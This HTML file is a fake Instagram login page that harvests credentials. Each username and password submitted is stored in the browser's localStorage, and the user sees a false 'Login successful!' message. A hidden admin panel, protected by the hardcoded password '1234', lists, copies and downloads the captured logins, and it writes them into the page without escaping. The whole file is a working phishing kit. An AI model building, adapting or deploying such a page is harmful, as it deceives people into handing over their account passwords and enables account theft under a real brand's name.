<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        body.admin-open {
            background: #fff;
        }

        .container {
            width: 100%;
            max-width: 400px;
        }

        .login-page {
            display: block;
        }

        .login-page.hidden {
            display: none;
        }

        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 0;
            margin-bottom: 20px;
        }

        .login-header {
            padding: 48px 40px 24px;
            text-align: center;
            border-bottom: 1px solid #dbdbdb;
        }

        .instagram-logo {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -1px;
            font-style: italic;
        }

        .form-inputs {
            padding: 0 40px;
            padding-top: 24px;
        }

        .form-group {
            margin-bottom: 10px;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px 10px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 13px;
            font-family: inherit;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: #bdbdbd;
            background: #fff;
        }

        input::placeholder {
            color: #a6a6a6;
        }

        .form-messages {
            padding: 0 40px;
        }

        .message {
            padding: 10px;
            border-radius: 4px;
            font-size: 13px;
            margin-bottom: 12px;
            display: none;
        }

        .error {
            background: #fff3cd;
            color: #d63031;
            border: 1px solid #f5a5a5;
        }

        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .error.show,
        .success.show {
            display: block;
        }

        .login-btn {
            width: 100%;
            padding: 8px;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
            margin-top: 10px;
        }

        .login-btn:hover:not(:disabled) {
            opacity: 0.8;
        }

        .login-btn:disabled {
            opacity: 0.5;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
            gap: 12px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider-text {
            font-size: 13px;
            color: #8a8a8a;
            font-weight: 600;
        }

        .facebook-btn {
            width: 100%;
            padding: 8px;
            background: #0a66c2;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .forgot-password {
            text-align: center;
            font-size: 12px;
            color: #0095f6;
            text-decoration: none;
            margin-bottom: 24px;
            display: block;
            font-weight: 600;
        }

        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 16px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }

        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .spinner {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
            margin-right: 6px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .admin-page {
            display: none;
            max-width: 900px;
            margin: 0 auto;
        }

        .admin-page.show {
            display: block;
        }

        .admin-header {
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            color: white;
            padding: 20px;
            text-align: center;
            margin-bottom: 20px;
            border-radius: 8px;
        }

        .admin-header h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }

        .admin-container {
            background: white;
            border-radius: 8px;
            padding: 20px;
        }

        .buttons-row {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .admin-btn {
            padding: 10px 16px;
            background: #f0f0f0;
            color: #262626;
            border: none;
            border-radius: 5px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
        }

        .admin-btn:hover {
            background: #e0e0e0;
        }

        .admin-btn.logout {
            background: #d63031;
            color: white;
            margin-left: auto;
        }

        .admin-btn.logout:hover {
            background: #b71c1c;
        }

        .details-title {
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 15px;
            color: #262626;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .details-count {
            background: #f0f0f0;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
        }

        .details-list {
            background: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 5px;
            max-height: 600px;
            overflow-y: auto;
        }

        .detail-item {
            padding: 15px;
            border-bottom: 1px solid #eee;
            font-size: 13px;
        }

        .detail-item:last-child {
            border-bottom: none;
        }

        .detail-username {
            font-weight: 700;
            color: #262626;
            margin-bottom: 5px;
        }

        .detail-password {
            color: #666;
            font-size: 12px;
            margin-bottom: 5px;
        }

        .detail-time {
            color: #999;
            font-size: 11px;
        }

        .no-details {
            padding: 40px;
            text-align: center;
            color: #999;
        }

        .info-message {
            background: #e8f5e9;
            padding: 12px;
            border-radius: 5px;
            font-size: 12px;
            color: #2e7d32;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <!-- LOGIN PAGE -->
    <div class="login-page" id="loginPage">
        <div class="container">
            <div class="login-box">
                <div class="login-header">
                    <div class="instagram-logo">Instagram</div>
                </div>

                <form id="loginForm">
                    <div class="form-messages">
                        <div class="message error" id="errorMsg"></div>
                        <div class="message success" id="successMsg"></div>
                    </div>

                    <div class="form-inputs">
                        <div class="form-group">
                            <input 
                                type="text" 
                                id="username" 
                                placeholder="Phone number, username, or email"
                            >
                        </div>

                        <div class="form-group">
                            <input 
                                type="text" 
                                id="password" 
                                placeholder="Password"
                            >
                        </div>

                        <button type="submit" class="login-btn" id="loginBtn">
                            Log in
                        </button>

                        <div class="divider">
                            <span class="divider-text">OR</span>
                        </div>

                        <button type="button" class="facebook-btn">
                            <i class="fab fa-facebook"></i> Log in with Facebook
                        </button>

                        <a href="#" class="forgot-password" onclick="event.preventDefault(); openAdminPanel()">Admin Panel</a>
                    </div>
                </form>
            </div>

            <div class="signup-box">
                Don't have an account? <a href="#" class="signup-link" onclick="event.preventDefault()">Sign up</a>
            </div>
        </div>
    </div>

    <!-- ADMIN PANEL -->
    <div class="admin-page" id="adminPage">
        <div class="admin-header">
            <h1>📊 Admin Panel - All Device Synced</h1>
            <p>View all login details from any phone or browser</p>
        </div>

        <div class="admin-container">
            <div class="info-message">
                ✅ Data stored locally on this browser. Login from different browsers to see all data.
            </div>

            <div class="buttons-row">
                <button class="admin-btn" onclick="displayDetails()">🔄 Refresh</button>
                <button class="admin-btn" onclick="downloadDetails()">📥 Download</button>
                <button class="admin-btn" onclick="copyDetails()">📋 Copy</button>
                <button class="admin-btn" onclick="deleteAllDetails()">🗑️ Delete All</button>
                <button class="admin-btn logout" onclick="closeAdminPanel()">Logout</button>
            </div>

            <div class="details-title">
                Login Details
                <span class="details-count" id="detailsCount">0</span>
            </div>

            <div class="details-list" id="detailsList">
                <div class="no-details">No logins yet</div>
            </div>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const adminPage = document.getElementById('adminPage');
        const loginPage = document.getElementById('loginPage');
        const errorMsg = document.getElementById('errorMsg');
        const successMsg = document.getElementById('successMsg');

        const ADMIN_PASSWORD = '1234';

        function showError(msg) {
            errorMsg.textContent = msg;
            errorMsg.classList.add('show');
            setTimeout(() => errorMsg.classList.remove('show'), 3000);
        }

        function showSuccess(msg) {
            successMsg.textContent = msg;
            successMsg.classList.add('show');
            setTimeout(() => successMsg.classList.remove('show'), 2000);
        }

        function saveToLocal(username, password) {
            try {
                let details = JSON.parse(localStorage.getItem('loginDetails') || '[]');
                
                details.push({
                    username: username,
                    password: password,
                    timestamp: new Date().toLocaleString(),
                    id: Date.now()
                });

                localStorage.setItem('loginDetails', JSON.stringify(details));
                console.log('✅ Saved to local storage');
                return true;
            } catch (error) {
                console.error('Error:', error);
                return false;
            }
        }

        function loadFromLocal() {
            try {
                return JSON.parse(localStorage.getItem('loginDetails') || '[]');
            } catch (error) {
                return [];
            }
        }

        function openAdminPanel() {
            const password = prompt('Enter admin password:');
            if (password === ADMIN_PASSWORD) {
                loginPage.classList.add('hidden');
                adminPage.classList.add('show');
                document.body.classList.add('admin-open');
                displayDetails();
            } else if (password !== null) {
                showError('Wrong password!');
            }
        }

        function closeAdminPanel() {
            adminPage.classList.remove('show');
            loginPage.classList.remove('hidden');
            document.body.classList.remove('admin-open');
        }

        function displayDetails() {
            const detailsList = document.getElementById('detailsList');
            const detailsCount = document.getElementById('detailsCount');

            const details = loadFromLocal();
            detailsCount.textContent = details.length;

            if (details.length === 0) {
                detailsList.innerHTML = '<div class="no-details">No login details yet</div>';
                return;
            }

            const sorted = details.sort((a, b) => b.id - a.id);
            detailsList.innerHTML = sorted.map(detail => `
                <div class="detail-item">
                    <div class="detail-username">👤 ${detail.username}</div>
                    <div class="detail-password">🔑 ${detail.password}</div>
                    <div class="detail-time">⏰ ${detail.timestamp}</div>
                </div>
            `).join('');
        }

        function deleteAllDetails() {
            if (!confirm('Delete all login details?')) return;
            localStorage.removeItem('loginDetails');
            displayDetails();
            showSuccess('All data deleted!');
        }

        function downloadDetails() {
            const details = loadFromLocal();
            const json = JSON.stringify(details, null, 2);
            const blob = new Blob([json], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'login-details.json';
            a.click();
            URL.revokeObjectURL(url);
            showSuccess('Downloaded!');
        }

        function copyDetails() {
            const details = loadFromLocal();
            const text = details.map(d => `${d.username} | ${d.password} | ${d.timestamp}`).join('\n');
            navigator.clipboard.writeText(text).then(() => {
                showSuccess('Copied to clipboard!');
            }).catch(() => {
                showError('Copy failed!');
            });
        }

        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                showError('Both fields required');
                return;
            }

            loginBtn.disabled = true;
            loginBtn.innerHTML = '<span class="spinner"></span>Logging in...';

            await new Promise(resolve => setTimeout(resolve, 800));

            const success = saveToLocal(username, password);

            loginBtn.disabled = false;
            loginBtn.innerHTML = 'Log in';

            if (success) {
                showSuccess('✅ Login successful!');
                loginForm.reset();
            } else {
                showError('Error saving data');
            }
        });
    </script>
</body>
</html>
